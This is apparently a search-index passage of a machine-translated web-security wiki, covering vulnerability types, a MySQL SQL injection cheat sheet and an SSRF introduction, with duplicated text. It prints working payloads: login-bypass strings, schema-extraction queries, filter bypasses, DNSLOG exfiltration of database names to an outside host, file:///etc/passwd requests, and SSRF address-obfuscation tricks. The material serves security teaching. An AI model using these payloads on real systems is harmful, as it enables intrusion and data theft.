and querying the data, and misses the authority. So testing over-authorization is a process of careful planning with developers. Sensitive information disclosure \u00b6 Sensitive information refers to information that is not known to the public, has actual and potential use value, and is harmless to society, business or individuals due to loss, improper use or unauthorized access. Including: personal privacy information, business operations information, financial information, personnel information, IT operation and maintenance information. Leaks include Github, Baidu Library, Google code, website directories, and more. Incorrect security configuration \u00b6 Security Misconfiguration: Sometimes, using the default security configuration can make your application vulnerable to multiple attacks. It is important to use the best security configuration available in deployed applications, web servers, database servers, operating systems, code libraries, and all application-related components. WAF \u00b6 Web application protection system (also known as: Web application level intrusion prevention system. English: Web Application Firewall, referred to as: WAF). Take advantage of an internationally accepted statement: WEB Application Firewall is a product that specifically protects WEB applications by implementing a series of security policies for HTTP/HTTPS. IDS \u00b6 IDS is the abbreviation of English Intrusion Detection Systems, which means \"intrusion detection system\" in Chinese. Professionally speaking, according to a certain security policy, through the software and hardware, the network and system operation status are monitored, and various attack attempts, attacks or attack results are found as much as possible to ensure the confidentiality and integrity of the network system resources. And availability. To make an image metaphor: If the firewall is the door lock of a building, IDS is the monitoring system in this building. Once the thief climbs into the building, or the insider has an out-of-bounds behavior, only the real-time monitoring system can detect the situation and issue a warning. IPS \u00b6 Intrusion Prevention System (IPS) is a computer network security facility that complements Antivirus Programs and Packet Filters (Application Gateways). Intrusion-prevention system is a computer network security device that can monitor the network data transmission behavior of a network or network device, and can instantly interrupt, adjust or isolate some abnormal or harmful network data transmission behavior. . References \u00b6 WEB \u6e17\u900f Wiki","title":"Introduction to Web Applications"},{"location":"web/introduction/#sql-injection","text":"By injecting SQL syntax into user-controllable parameters, the original SQL structure is destroyed, and the attack behavior of unexpected results when writing the program is achieved. The cause can be attributed to the superposition of the following two reasons: The programmer writes the SQL statement using string concatenation when dealing with application and database interactions. The user controllable parameters are not filtered enough to splicing the parameters into the SQL statement.","title":"SQL Injection"},{"location":"web/introduction/#xss-cross-site-scripting-attack","text":"Cross Site Scripting is abbreviated to the abbreviation of Cascading Style Sheets (CSS), so the cross-site scripting attack is abbreviated as XSS. A malicious attacker inserts malicious HTML code into the WEB page. When the user browses the page, the HTML code embedded in the Web will be executed, thereby achieving the special purpose of maliciously attacking the user.","title":"XSS Cross-site scripting attack"},{"location":"web/introduction/#command-execution","text":"When an application needs to call some external program to process the content, some functions that execute system commands are used. For example, system , exec , shell_exec , etc. in PHP, when the user can control the parameters in the command execution function, the malicious system command can be injected into the normal command, causing the command execution attack. Here is mainly the introduction of command execution vulnerabilities mainly in PHP, and the details of Java and other applications are to be added.","title":"Command Execution"},{"location":"web/introduction/#file-contains","text":"If the client user input is allowed to control the files dynamically included in the server, it will lead to the execution of malicious code and the disclosure of sensitive information, mainly including local file inclusion and remote file inclusion.","title":"File contains"},{"location":"web/introduction/#csrf-cross-site-request-forgery","text":"Cross-Site Request Forgery (CSRF) is an attack that causes a logged-in user to perform some action without their knowledge. Because the attacker does not see the response to the fake request, the CSRF attack is mainly used to perform actions instead of stealing user data. When the victim is a normal user, CSRF can transfer the user's funds, send mail, etc. without their knowledge; but if the victim is a user with administrator rights, CSRF may threaten the entire WEB system. Safety.","title":"CSRF Cross-site request forgery"},{"location":"web/introduction/#ssrf-server-side-request-forgery","text":"SSRF (Server-Side Request Forgery) is a security vulnerability that is constructed by an attacker to form a request initiated by a server. In general, the target of an SSRF attack is an internal system that is inaccessible from the external network.","title":"SSRF server-side request forgery"},{"location":"web/introduction/#file-upload","text":"In the operation of the website, it is inevitable to update some pages or contents of the website, and then the function of uploading files to the website is needed. If you do not restrict the restrictions or the restrictions are bypassed, this feature may be used to upload executable files, scripts to the server, and further cause the server to fall.","title":"File Upload"},{"location":"web/introduction/#click-to-hijack","text":"Clickjacking was first created in 2008 by Internet security experts Robert Hansen and Jeremiah Grausman. It is a kind of visual spoofing. On the WEB side, the iframe is nested with a transparent and invisible page, so that the user can click on the location where the attacker wants to trick the user into clicking without knowing it. Due to the appearance of clickjacking, there is a way of anti-frame nesting, because clickjacking requires iframe nested pages to attack. The following code is the most common example of preventing frame nesting: ` js if(top.location!=location) top.location=self.location; ## VPS Virtual Private Server VPS (Virtual Private Server) technology, which divides a server into high-quality services for multiple virtual private servers. The technology for implementing VPS is divided into container technology and virtualization technology. In a container or virtual machine, each VPS can be assigned a separate public IP address, a separate operating system, and achieve isolation between different VPS disk space, memory, CPU resources, processes, and system configurations, simulating exclusive use for users and applications. The experience of using computing resources. VPS can reinstall the operating system, install programs, and restart the server separately, just like a standalone server. VPS provides users with the freedom to manage configurations for enterprise virtualization or for IDC resource leases. IDC resource rental, provided by the VPS provider. The difference in hardware VPS software used by different VPS providers and the different sales strategies, the VPS experience is also quite different. Especially when the VPS provider is oversold, the VPS performance will be greatly affected when the physical server is overloaded. Relatively speaking, container technology is more efficient and more expensive than virtual machine technology hardware, so the price of container VPS is generally lower than the price of virtual machine VPS. ## Conditional competition A conditional contention vulnerability is a server-side vulnerability. Because the server side processes concurrently when processing requests from different users, such problems may occur if the concurrent processing is improper or the logical sequence design of the related operations is unreasonable. . ## XXE XXE Injection is XML External Entity Injection, which is an XML external entity injection attack. Vulnerabilities are security issues caused when processing non-secure external entity data. In the XML 1.0 standard, the concept of entities is defined in the XML document structure. Entities can be called in the document by pre-definition, and the identifier of the entity can access local or remote content. If &quot;pollution&quot; is introduced in the process Sources, after processing XML documents, can lead to security issues such as information leakage. ## XSCH Due to the negligence of web developers in the development process using Flash, Silverlight, etc., the correct configuration of the cross-domain policy file (crossdomain.xml) did not cause problems. E.g: ```xml <cross-domain-policy> <allow-access-from domain=\u201c*\u201d/> </cross-domain-policy> Because the cross-domain policy file is configured as * , it means that any domain Flash can interact with it, which can initiate requests and get data.","title":"Click to hijack"},{"location":"web/introduction/#function-level-access-missing","text":"An unauthorized vulnerability is a common security vulnerability in web applications. Its threat is that an account can control the total station user data. Of course, this data is limited to the data corresponding to the vulnerability feature. The cause of the ultra-authority vulnerability is mainly because the developer over-trusts the data requested by the client when adding, deleting, modifying, and querying the data, and misses the authority. So testing over-authorization is a process of careful planning with developers.","title":"\u8d8a\u6743 (function level access missing)"},{"location":"web/introduction/#sensitive-information-disclosure","text":"Sensitive information refers to information that is not known to the public, has actual and potential use value, and is harmless to society, business or individuals due to loss, improper use or unauthorized access. Including: personal privacy information, business operations information, financial information, personnel information, IT operation and maintenance information. Leaks include Github, Baidu Library, Google code, website directories, and more.","title":"Sensitive information disclosure"},{"location":"web/introduction/#incorrect-security-configuration","text":"Security Misconfiguration: Sometimes, using the default security configuration can make your application vulnerable to multiple attacks. It is important to use the best security configuration available in deployed applications, web servers, database servers, operating systems, code libraries, and all application-related components.","title":"Incorrect security configuration"},{"location":"web/introduction/#waf","text":"Web application protection system (also known as: Web application level intrusion prevention system. English: Web Application Firewall, referred to as: WAF). Take advantage of an internationally accepted statement: WEB Application Firewall is a product that specifically protects WEB applications by implementing a series of security policies for HTTP/HTTPS.","title":"WAF"},{"location":"web/introduction/#ids","text":"IDS is the abbreviation of English Intrusion Detection Systems, which means \"intrusion detection system\" in Chinese. Professionally speaking, according to a certain security policy, through the software and hardware, the network and system operation status are monitored, and various attack attempts, attacks or attack results are found as much as possible to ensure the confidentiality and integrity of the network system resources. And availability. To make an image metaphor: If the firewall is the door lock of a building, IDS is the monitoring system in this building. Once the thief climbs into the building, or the insider has an out-of-bounds behavior, only the real-time monitoring system can detect the situation and issue a warning.","title":"IDS"},{"location":"web/introduction/#ips","text":"Intrusion Prevention System (IPS) is a computer network security facility that complements Antivirus Programs and Packet Filters (Application Gateways). Intrusion-prevention system is a computer network security device that can monitor the network data transmission behavior of a network or network device, and can instantly interrupt, adjust or isolate some abnormal or harmful network data transmission behavior. .","title":"IPS"},{"location":"web/introduction/#references","text":"WEB \u6e17\u900f Wiki","title":"References"},{"location":"web/sqli/","text":"basic concept \u00b6 SQL injection is an input parameter that inserts or adds SQL code to an application (user), and then passes these parameters to the backend SQL server for parsing and execution. An attacker can modify an SQL statement that has the same permissions as the component that executes the command, such as a database server, application server, or web server. SQL injection usually occurs if the WEB application developer cannot ensure that the value received from the WEB form, cookies, input parameters, etc. is passed to the SQL query (which is executed on the database server) before it is verified Vulnerabilities. Common tools \u00b6 Burp Suite: Introduction to Burp Suite Tamper Data (Firefox addon) HackBar (Firefox addon) sqlmap: sqlmap user manual Injecting common parameters \u00b6 user() : current database user database() : current database name version() : the currently used database version @@datadir : database storage data path concat() : Union data used to combine two data results. Such as concat(username,0x3a,password) group_concat() : Similar to concat() , such as group_concat(DISTINCT+user, 0x3a, password) , used to inject multiple pieces of data at once concat_ws() : usage is similar hex() and unhex() : for hex encoding and decoding load_file() : Read the file as text. In Windows, the path is set to \\\\ select xxoo into outfile &#39;path&#39; : can write files directly when the permission is high Grammar Reference and Tips \u00b6 Interline Notes \u00b6 -- DROP sampletable ; -- # DROP sampletable ; # Inline comment \u00b6 /* comment content */ DROP /*comment*/ sampletable ` DR /**/ OP /* bypass filtering */ sampletable ` SELECT /* replace spaces */ password /**/ FROM /**/ Members /*! MYSQL exclusive*/ SELECT /*!32302 1/0, */ 1 FROM tablename string encoding \u00b6 ASCII() : return the ASCII value of the character CHAR() : converts an integer to the corresponding character Backstage universal password \u00b6 admin' -- admin' # admin'/* ' or 1=1-- ' or 1=1# ' or 1=1/* ') or '1'='1-- ') or ('1'='1-- Log in as different users ' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1-- Injection statement memo \u00b6 data storage name \u00b6 SELECT database (); SELECT schema_name FROM information_schema . schemata ; Table Name \u00b6 union query --version=9 for MySQL 4 and version=10 for MySQL 5 UNION SELECT GROUP_CONCAT ( table_name ) FROM information_schema . tables WHERE version = 10 ; /* Lists the tables in the current database*/ UNION SELECT TABLE_NAME FROM information_schema . tables WHERE TABLE_SCHEMA = database (); /* Lists tables in all user-defined databases*/ SELECT table_schema , table_name FROM information_schema . tables WHERE table_schema != 'information_schema' AND table_schema != 'mysql' ; blind AND SELECT SUBSTR ( table_name , 1 , 1 ) FROM information_schema . tables > 'A' Error AND ( SELECT COUNT ( * ) FROM ( SELECT 1 UNION SELECT null UNION SELECT ! 1 ) x GROUP BY CONCAT (( SELECT table_name FROM information_schema . tables LIMIT 1 ), FLOOR ( RAND ( 0 ) * 2 ))) ( @ : = 1 ) ||@ GROUP BY CONCAT (( SELECT table_name FROM information_schema . tables LIMIT 1 ), !@ ) HAVING @|| MIN ( @ : = 0 ); AND ExtractValue ( 1 , CONCAT ( 0 x5c , ( SELECT table_name FROM information_schema . tables LIMIT 1 ))); -- Successful in version 5.1.5. Column name \u00b6 union query UNION SELECT GROUP_CONCAT ( column_name ) FROM information_schema . columns WHERE table_name = 'tablename' blind AND SELECT SUBSTR ( column_name , 1 , 1 ) FROM information_schema . columns > 'A' Error -- Successful in version 5.1.5 AND ( 1 , 2 , 3 ) = ( SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1 , 2 , 3 LIMIT 1 ) -- MySQL 5.1 has been fixed AND ( SELECT COUNT ( * ) FROM ( SELECT 1 UNION SELECT null UNION SELECT ! 1 ) x GROUP BY CONCAT (( SELECT column_name FROM information_schema . columns LIMIT 1 ), FLOOR ( RAND ( 0 ) * 2 ))) ( @ : = 1 ) ||@ GROUP BY CONCAT (( SELECT column_name FROM information_schema . columns LIMIT 1 ), !@ ) HAVING @|| MIN ( @ : = 0 ); AND ExtractValue ( 1 , CONCAT ( 0 x5c , ( SELECT column_name FROM information_schema . columns LIMIT 1 ))); Use PROCEDURE ANALYSIS () -- This requires a web display page with a field for the query you injected -- Get the first paragraph name SELECT username , permission FROM Users WHERE id = 1 ; 1 PROCEDURE ANALYSE () -- Get the second section name 1 LIMIT 1 . 1 PROCEDURE ANALYSIS () -- Get the third paragraph name 1 LIMIT 2 . 1 PROCEDURE ANALYSIS () Query the table based on the column name \u00b6 -- Query the table whose name is username SELECT table_name FROM information_schema . columns WHERE column_name = 'username' ; -- Query the table containing the username in the field name SELECT table_name FROM information_schema . columns WHERE column_name LIKE '%user%' ; Bypassing quotes \u00b6 -- hex encoding SELECT * FROM Users WHERE username = 0 x61646D696E -- char() function SELECT * FROM Users WHERE username = CHAR ( 97 , 100 , 109 , 105 , 110 ) Bypassing the string blacklist \u00b6 SELECT 'a' 'd' 'mi' 'n' ; SELECT CONCAT ( 'a' , 'd' , 'm' , 'i' , 'n' ); SELECT CONCAT_WS ( '' , 'a' , 'd' , 'm' , 'i' , 'n' ); SELECT GROUP_CONCAT ( 'a' , 'd' , 'm' , 'i' , 'n' ); When CONCAT() is used, any argument is null and will return null. It is recommended to use CONCAT_WS() . The first argument of the CONCAT_WS() function indicates which character interval is used to query the result. Conditional statements \u00b6 CASE , IF() , IFNULL() , NULLIF() . SELECT IF ( 1 = 1 , true , false ); SELECT CASE WHEN 1 = 1 THEN true ELSE false END ; Delay function \u00b6 SLEEP() , BENCHMARK() . ' - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1(' true ')), false)) - ' order by post injection \u00b6 order by Because it is a sort statement, you can use the conditional statement to make judgments, and judge the true and false conditions according to the returned sorting result. Variables with order or order by are probably the kind of injections. When you know a field, you can do the following: Original link: http://www.test.com/list.php?order=vote Sort according to the vote field. Find the ticket with the highest number of votes num and construct the following link: http : // www . test . com / list . php ? order = abs ( vote - ( length ( user ()) > 0 ) * num ) + asc See if the sorting changes. There is another way to not know any field information, use the rand function: http : // www . test . com / list . php ? order = rand ( true ) http : // www . test . com / list . php ? order = rand ( false ) The above two will return different sorts, and the statement that determines whether the first character in the table name is less than 128 is as follows: http : // www . test . com / list . php ? order = rand (( select char ( substring ( table_name , 1 , 1 )) from information_schema . tables limit 1 ) <= 128 )) Wide byte injection \u00b6 The most commonly used GBK code in the country, this way is mainly to bypass the transfer of special characters such as addslashes . The slash of backslash \\ is %5c . When you type %bf%27 , the function encounters the single quotes and automatically transfers to \\ , which becomes %bf%5c%. 27 , %bf%5c In GBK it becomes a wide character \"\u7f1e\". %bf The position can be any character in the middle of %81-%fe . Not only in SQL injection, wide character injection can be applied in many places. DNSLOG Injection \u00b6 DNS will leave a log when parsing, and obtain information by reading the parsing log of the multi-level domain name. Simply put, put the information in the advanced domain name, pass it to yourself, then read the log and get the information. Dnslog platform: [ http://ceye.io/ ] ( http://ceye.io/ ) mysql > use security ; Database changed mysql > select load_file ( '\\\\\\\\test.xxx.ceye.io\\\\abc' ); + -------------------------------------------+ | load_file ( '\\\\\\\\test.xxx.ceye.io\\\\abc' ) | + -------------------------------------------+ | NULL | + -------------------------------------------+ 1 row in set ( 22 . 05 sec ) mysql > select load_file ( concat ( '\\\\\\\\' ,( select database ()), '.xxx.ceye.io\\\\abc' )); + ----------------------------------------------------------------------+ | load_file ( concat ( '\\\\\\\\' ,( select database ()), '.xxx.ceye.io\\\\abc' )) | + ----------------------------------------------------------------------+ | NULL | + ----------------------------------------------------------------------+ 1 row in set ( 0 . 00 sec ) References \u00b6 SQL Injection Cheat Sheet MySQL Injection Tips MySQL Injection Science MySQL Injection Summary SQL Injection Attack and Defense","title":"SQL Injection"},{"location":"web/sqli/#basic-concept","text":"SQL injection is an input parameter that inserts or adds SQL code to an application (user), and then passes these parameters to the backend SQL server for parsing and execution. An attacker can modify an SQL statement that has the same permissions as the component that executes the command, such as a database server, application server, or web server. SQL injection usually occurs if the WEB application developer cannot ensure that the value received from the WEB form, cookies, input parameters, etc. is passed to the SQL query (which is executed on the database server) before it is verified Vulnerabilities.","title":"basic concept"},{"location":"web/sqli/#common-tools","text":"Burp Suite: Introduction to Burp Suite Tamper Data (Firefox addon) HackBar (Firefox addon) sqlmap: sqlmap user manual","title":"Common tools"},{"location":"web/sqli/#injecting-common-parameters","text":"user() : current database user database() : current database name version() : the currently used database version @@datadir : database storage data path concat() : Union data used to combine two data results. Such as concat(username,0x3a,password) group_concat() : Similar to concat() , such as group_concat(DISTINCT+user, 0x3a, password) , used to inject multiple pieces of data at once concat_ws() : usage is similar hex() and unhex() : for hex encoding and decoding load_file() : Read the file as text. In Windows, the path is set to \\\\ select xxoo into outfile &#39;path&#39; : can write files directly when the permission is high","title":"Injecting common parameters"},{"location":"web/sqli/#grammar-reference-and-tips","text":"","title":"Grammar Reference and Tips"},{"location":"web/sqli/#interline-notes","text":"-- DROP sampletable ; -- # DROP sampletable ; #","title":"Interline Notes"},{"location":"web/sqli/#inline-comment","text":"/* comment content */ DROP /*comment*/ sampletable ` DR /**/ OP /* bypass filtering */ sampletable ` SELECT /* replace spaces */ password /**/ FROM /**/ Members /*! MYSQL exclusive*/ SELECT /*!32302 1/0, */ 1 FROM tablename","title":"Inline comment"},{"location":"web/sqli/#string-encoding","text":"ASCII() : return the ASCII value of the character CHAR() : converts an integer to the corresponding character","title":"string encoding"},{"location":"web/sqli/#backstage-universal-password","text":"admin' -- admin' # admin'/* ' or 1=1-- ' or 1=1# ' or 1=1/* ') or '1'='1-- ') or ('1'='1-- Log in as different users ' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--","title":"Backstage universal password"},{"location":"web/sqli/#injection-statement-memo","text":"","title":"Injection statement memo"},{"location":"web/sqli/#data-storage-name","text":"SELECT database (); SELECT schema_name FROM information_schema . schemata ;","title":"data storage name"},{"location":"web/sqli/#table-name","text":"union query --version=9 for MySQL 4 and version=10 for MySQL 5 UNION SELECT GROUP_CONCAT ( table_name ) FROM information_schema . tables WHERE version = 10 ; /* Lists the tables in the current database*/ UNION SELECT TABLE_NAME FROM information_schema . tables WHERE TABLE_SCHEMA = database (); /* Lists tables in all user-defined databases*/ SELECT table_schema , table_name FROM information_schema . tables WHERE table_schema != 'information_schema' AND table_schema != 'mysql' ; blind AND SELECT SUBSTR ( table_name , 1 , 1 ) FROM information_schema . tables > 'A' Error AND ( SELECT COUNT ( * ) FROM ( SELECT 1 UNION SELECT null UNION SELECT ! 1 ) x GROUP BY CONCAT (( SELECT table_name FROM information_schema . tables LIMIT 1 ), FLOOR ( RAND ( 0 ) * 2 ))) ( @ : = 1 ) ||@ GROUP BY CONCAT (( SELECT table_name FROM information_schema . tables LIMIT 1 ), !@ ) HAVING @|| MIN ( @ : = 0 ); AND ExtractValue ( 1 , CONCAT ( 0 x5c , ( SELECT table_name FROM information_schema . tables LIMIT 1 ))); -- Successful in version 5.1.5.","title":"Table Name"},{"location":"web/sqli/#column-name","text":"union query UNION SELECT GROUP_CONCAT ( column_name ) FROM information_schema . columns WHERE table_name = 'tablename' blind AND SELECT SUBSTR ( column_name , 1 , 1 ) FROM information_schema . columns > 'A' Error -- Successful in version 5.1.5 AND ( 1 , 2 , 3 ) = ( SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1 , 2 , 3 LIMIT 1 ) -- MySQL 5.1 has been fixed AND ( SELECT COUNT ( * ) FROM ( SELECT 1 UNION SELECT null UNION SELECT ! 1 ) x GROUP BY CONCAT (( SELECT column_name FROM information_schema . columns LIMIT 1 ), FLOOR ( RAND ( 0 ) * 2 ))) ( @ : = 1 ) ||@ GROUP BY CONCAT (( SELECT column_name FROM information_schema . columns LIMIT 1 ), !@ ) HAVING @|| MIN ( @ : = 0 ); AND ExtractValue ( 1 , CONCAT ( 0 x5c , ( SELECT column_name FROM information_schema . columns LIMIT 1 ))); Use PROCEDURE ANALYSIS () -- This requires a web display page with a field for the query you injected -- Get the first paragraph name SELECT username , permission FROM Users WHERE id = 1 ; 1 PROCEDURE ANALYSE () -- Get the second section name 1 LIMIT 1 . 1 PROCEDURE ANALYSIS () -- Get the third paragraph name 1 LIMIT 2 . 1 PROCEDURE ANALYSIS ()","title":"Column name"},{"location":"web/sqli/#query-the-table-based-on-the-column-name","text":"-- Query the table whose name is username SELECT table_name FROM information_schema . columns WHERE column_name = 'username' ; -- Query the table containing the username in the field name SELECT table_name FROM information_schema . columns WHERE column_name LIKE '%user%' ;","title":"Query the table based on the column name"},{"location":"web/sqli/#bypassing-quotes","text":"-- hex encoding SELECT * FROM Users WHERE username = 0 x61646D696E -- char() function SELECT * FROM Users WHERE username = CHAR ( 97 , 100 , 109 , 105 , 110 )","title":"Bypassing quotes"},{"location":"web/sqli/#bypassing-the-string-blacklist","text":"SELECT 'a' 'd' 'mi' 'n' ; SELECT CONCAT ( 'a' , 'd' , 'm' , 'i' , 'n' ); SELECT CONCAT_WS ( '' , 'a' , 'd' , 'm' , 'i' , 'n' ); SELECT GROUP_CONCAT ( 'a' , 'd' , 'm' , 'i' , 'n' ); When CONCAT() is used, any argument is null and will return null. It is recommended to use CONCAT_WS() . The first argument of the CONCAT_WS() function indicates which character interval is used to query the result.","title":"Bypassing the string blacklist"},{"location":"web/sqli/#conditional-statements","text":"CASE , IF() , IFNULL() , NULLIF() . SELECT IF ( 1 = 1 , true , false ); SELECT CASE WHEN 1 = 1 THEN true ELSE false END ;","title":"Conditional statements"},{"location":"web/sqli/#delay-function","text":"SLEEP() , BENCHMARK() . ' - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1(' true ')), false)) - '","title":"Delay function"},{"location":"web/sqli/#order-by-post-injection","text":"order by Because it is a sort statement, you can use the conditional statement to make judgments, and judge the true and false conditions according to the returned sorting result. Variables with order or order by are probably the kind of injections. When you know a field, you can do the following: Original link: http://www.test.com/list.php?order=vote Sort according to the vote field. Find the ticket with the highest number of votes num and construct the following link: http : // www . test . com / list . php ? order = abs ( vote - ( length ( user ()) > 0 ) * num ) + asc See if the sorting changes. There is another way to not know any field information, use the rand function: http : // www . test . com / list . php ? order = rand ( true ) http : // www . test . com / list . php ? order = rand ( false ) The above two will return different sorts, and the statement that determines whether the first character in the table name is less than 128 is as follows: http : // www . test . com / list . php ? order = rand (( select char ( substring ( table_name , 1 , 1 )) from information_schema . tables limit 1 ) <= 128 ))","title":"order by post injection"},{"location":"web/sqli/#wide-byte-injection","text":"The most commonly used GBK code in the country, this way is mainly to bypass the transfer of special characters such as addslashes . The slash of backslash \\ is %5c . When you type %bf%27 , the function encounters the single quotes and automatically transfers to \\ , which becomes %bf%5c%. 27 , %bf%5c In GBK it becomes a wide character \"\u7f1e\". %bf The position can be any character in the middle of %81-%fe . Not only in SQL injection, wide character injection can be applied in many places.","title":"Wide byte injection"},{"location":"web/sqli/#dnslog-injection","text":"DNS will leave a log when parsing, and obtain information by reading the parsing log of the multi-level domain name. Simply put, put the information in the advanced domain name, pass it to yourself, then read the log and get the information. Dnslog platform: [ http://ceye.io/ ] ( http://ceye.io/ ) mysql > use security ; Database changed mysql > select load_file ( '\\\\\\\\test.xxx.ceye.io\\\\abc' ); + -------------------------------------------+ | load_file ( '\\\\\\\\test.xxx.ceye.io\\\\abc' ) | + -------------------------------------------+ | NULL | + -------------------------------------------+ 1 row in set ( 22 . 05 sec ) mysql > select load_file ( concat ( '\\\\\\\\' ,( select database ()), '.xxx.ceye.io\\\\abc' )); + ----------------------------------------------------------------------+ | load_file ( concat ( '\\\\\\\\' ,( select database ()), '.xxx.ceye.io\\\\abc' )) | + ----------------------------------------------------------------------+ | NULL | + ----------------------------------------------------------------------+ 1 row in set ( 0 . 00 sec )","title":"DNSLOG Injection"},{"location":"web/sqli/#references","text":"SQL Injection Cheat Sheet MySQL Injection Tips MySQL Injection Science MySQL Injection Summary SQL Injection Attack and Defense","title":"References"},{"location":"web/ssrf/","text":"SSRF Introduction \u00b6 SSRF, Server-Side Request Forgery, server request forgery, is a vulnerability that is constructed by an attacker to form a request initiated by the server. In general, the target of an SSRF attack is an internal system that is inaccessible from the external network. The reason for the vulnerability is mostly because the server provides the function of obtaining data from other server applications and does not filter and limit the target address. There are five main types of attacks that an attacker can make using SSRF: You can perform port scanning on the external network, the intranet where the server is located, and local, and obtain banner information for some services. Attack applications running on intranet or local (such as overflow) Fingerprint recognition of the intranet WEB application, by accessing the default file Attack web applications inside and outside the network, mainly attacks that can be implemented using GET parameters (such as Struts2, sqti, etc.) Use the file protocol to read local files, etc. SSRF Vulnerability scenarios \u00b6 Where there is a possibility to initiate a network request, there may be an SSRF vulnerability Request resources from a remote server (Upload from URL, Import & Export RSS Feed) Database built-in functions (Oracle, MongoDB, MSSQL, Postgres, CouchDB) Webmail collects other emails (POP3, IMAP, SMTP) File processing, encoding processing, attribute information processing (ffmpeg, ImageMagic, DOCX, PDF, XML) Common backend implementation \u00b6 file_get_contents <?php if ( isset ( $_POST [ 'url' ])) { $content = file_get_contents ( $_POST [ 'url' ]); $filename = './images/' . rand () . ';img1.jpg' ; file_put_contents ( $filename , $content ); echo $_POST [ 'url' ]; $img = \"<img src= \\\" \" . $filename . \" \\\" />\" ; } echo $img ; ?> This code uses the file_get_contents function to get the image from the URL specified by the user. It is then saved to the hard disk with a random file name and presented to the user. fsockopen() <?php function GetFile ( $host , $port , $link ) { $fp = fsockopen ( $host , intval ( $port ), $errno , $errstr , 30 ); if ( ! $fp ) { echo \" $errstr (error number $errno ) \\n \" ; } else { $out = \"GET $link HTTP/1.1 \\r\\n \" ; $out .= \"Host: $host\\r\\n \" ; $out .= \"Connection: Close \\r\\n\\r\\n \" ; $out .= \" \\r\\n \" ; fwrite ( $fp , $out ); $contents = '' ; while ( ! feof ( $fp )) { $contents .= fgets ( $fp , 1024 ); } fclose ( $fp ); return $contents ; } } ?> This code uses the fsockopen function to get the data (file or HTML) from the user's URL. This function uses a socket to establish a TCP connection with the server to transfer raw data. curl_exec() <?php if ( isset ( $_POST [ 'url' ])) { $link = $_POST [ 'url' ]; $curlobj = curl_init (); curl_setopt ( $curlobj , CURLOPT_POST , 0 ); curl_setopt ( $curlobj , CURLOPT_URL , $link ); curl_setopt ( $curlobj , CURLOPT_RETURNTRANSFER , 1 ); $result = curl_exec ( $curlobj ); curl_close ( $curlobj ); $filename = './curled/' . rand () . '.txt' ; file_put_contents ( $filename , $result ); echo $result ; } ?> Use curl to get the data. Scenarios that hinder SSRF exploits \u00b6 Server open OpenSSL cannot be used interactively The server needs authentication (Cookies & User: Pass) is not perfect The port that restricts requests is the commonly used port of http, for example, 80, 443, 8080, 8090. Disable unwanted protocols. Only http and https requests are allowed. Can prevent problems similar to file:///, gopher://, ftp://, etc. Unify the error message to prevent the user from judging the port status of the remote server based on the error message. Port scanning with SSRF \u00b6 According to the return information of the server, most applications will not judge the port, and the status of the port can be judged by the returned banner information. Backend implementation <?php if ( isset ( $_POST [ 'url' ])) { $link = $_POST [ 'url' ]; $filename = './curled/' . rand () . 'txt' ; $curlobj = curl_init ( $link ); $fp = fopen ( $filename , \"w\" ); curl_setopt ( $curlobj , CURLOPT_FILE , $fp ); curl_setopt ( $curlobj , CURLOPT_HEADER , 0 ); curl_exec ( $curlobj ); curl_close ( $curlobj ); fclose ( $fp ); $fp = fopen ( $filename , \"r\" ); $result = fread ( $fp , filesize ( $filename )); fclose ( $fp ); echo $result ; } ?> Construct a front page < html > < body > < form name = \"px\" method = \"post\" action = \"http://127.0.0.1/ss.php\" > < input type = \"text\" name = \"url\" value = \"\" > < input type = \"submit\" name = \"commit\" value = \"submit\" > </ form > < script ></ script > </ body > </ html > Requesting a non-HTTP port can return banner information. Or you can use the 302 jump to bypass the limitations of the HTTP protocol. Auxiliary script <?php $ip = $_GET [ 'ip' ]; $port = $_GET [ 'port' ]; $scheme = $_GET [ 's' ]; $data = $_GET [ 'data' ]; header ( \"Location: $scheme :// $ip : $port / $data \" ); ?> [Tencent SSRF vulnerability (very good use point) with script] (https:// thorns.gitbooks.io/sec/content/teng_xun_mou_chu_ssrf_lou_6d1e28_fei_chang_hao_de .html) Agreement Utilization \u00b6 Dict agreement dict://fuzz.wuyun.org:8080/helo:dict Gopher protocol gopher://fuzz.wuyun.org:8080/gopher File protocol file:///etc/passwd Bypass posture \u00b6 Change the IP address For example 192.168.0.1 octal format: 0300.0250.0.1 Hexadecimal format: 0xC0.0xA8.0.1 10-digit integer format: 3232235521 Hexadecimal integer format: 0xC0A80001 There is also a special omission mode, such as 10.0.0.1 which can be written as 10.1 Use the URL to resolve the problem In some cases, the backend program may parse the accessed URL and filter the resolved host address. At this time, the URL parameters may be parsed improperly, which may bypass the filtering. E.g: http://www.baidu.com@192.168.0.1/ and http://192.168.0.1 are all requested for 192.168.0.1 Can point to any ip domain name xip.io : http://127.0.0.1.xip.io/ ==> http://127.0.0.1/ Short address http://dwz.cn/11SMa ==> http://127.0.0.1 Use the period . : 127.0.0.1 ==> 127.0.0.1 \u5229\u7528Enclosed alphanumerics \u24d4\u24e7\u24d0\u24dc\u24df\u24db\u24d4.\u24d2\u24de\u24dc >>> example.com List: \u2460 \u2461 \u2462 \u2463 \u2464 \u2465 \u2466 \u2467 \u2468 \u2469 \u246a \u246b \u246c \u246d \u246e \u246f \u2470 \u2471 \u2472 \u2473 \u2474 \u2475 \u2476 \u2477 \u2478 \u2479 \u247a \u247b \u247c \u247d \u247e \u247f \u2480 \u2481 \u2482 \u2483 \u2484 \u2485 \u2486 \u2487 \u2488 \u2489 \u248a \u248b \u248c \u248d \u248e \u248f \u2490 \u2491 \u2492 \u2493 \u2494 \u2495 \u2496 \u2497 \u2498 \u2499 \u249a \u249b \u249c \u249d \u249e \u249f \u24a0 \u24a1 \u24a2 \u24a3 \u24a4 \u24a5 \u24a6 \u24a7 \u24a8 \u24a9 \u24aa \u24ab \u24ac \u24ad \u24ae \u24af \u24b0 \u24b1 \u24b2 \u24b3 \u24b4 \u24b5 \u24b6 \u24b7 \u24b8 \u24b9 \u24ba \u24bb \u24bc \u24bd \u24be \u24bf \u24c0 \u24c1 \u24c2 \u24c3 \u24c4 \u24c5 \u24c6 \u24c7 \u24c8 \u24c9 \u24ca \u24cb \u24cc \u24cd \u24ce \u24cf \u24d0 \u24d1 \u24d2 \u24d3 \u24d4 \u24d5 \u24d6 \u24d7 \u24d8 \u24d9 \u24da \u24db \u24dc \u24dd 